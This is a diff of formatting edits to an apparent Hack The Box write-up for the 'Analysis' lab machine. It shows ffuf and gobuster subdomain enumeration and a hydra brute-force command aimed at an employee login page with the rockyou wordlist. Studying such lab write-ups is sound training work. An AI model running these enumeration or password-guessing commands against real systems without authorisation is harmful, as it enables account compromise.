@@ -147,7 +147,7 @@ js                      [Status: 301, Size: 158, Words: 9, Lines: 2, Duration: 2
 bat                     [Status: 301, Size: 159, Words: 9, Lines: 2, Duration: 28ms]
 ```
 
-**Vhost and Subdomain enumeration**:
+**Vhost** and **Subdomain enumeration**:
 
 ```bash
 $ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -u http://10.10.11.250 -H "HOST: FUZZ.analysis.htb"
@@ -174,13 +174,9 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 Starting gobuster in DNS enumeration mode
 ===============================================================
 Found: www.analysis.htb
-
 Found: internal.analysis.htb
-
 Found: gc._msdcs.analysis.htb
-
 Found: domaindnszones.analysis.htb
-
 Found: forestdnszones.analysis.htb
 ```
 
@@ -374,7 +370,7 @@ badam                   [Status: 200, Size: 412, Words: 11, Lines: 1, Duration: 
 
 It seems that we have 3 users that we could maybe use to login to the portal. We can put those usernames in a new list and try brute-forcing their passwords. The login portal looks let us know that employees use their email to login and not their username:
 
-![](employees_loginPHP.png)
+![](employees_loginPHP.png){: .normal width="65%"}
 
 
 ```bash
@@ -388,15 +384,16 @@ badam@analysis.htb
 
 We can now trying brute-forcing `/login.php`. We can find what is the appropriate string to put on the `hydra`'s `F` parameter by using some random credentials, e.g. `test:test`, to login:
 
-![](test_login_error.png)
+![](test_login_error.png){: .normal width="65%"}
 
 The text we should put there is not the "*Wrong Data*" string, but what is hidden in the source code as the **class label**, i.e., "*text-danger*":
 
-![](text-danger.png)
+![](text-danger.png){: .normal width="65%"}
 
 ```bash
 # brute-forcing the login portal
 $ hydra -L mailList_reduced -P /usr/share/wordlists/rockyou.txt internal.analysis.htb http-post-form "/employees/login.php:log=^USER^&pwd=^PASS^:F=text-danger" -t 30
+# nothing back
 ```
 
 ## LDAP Research
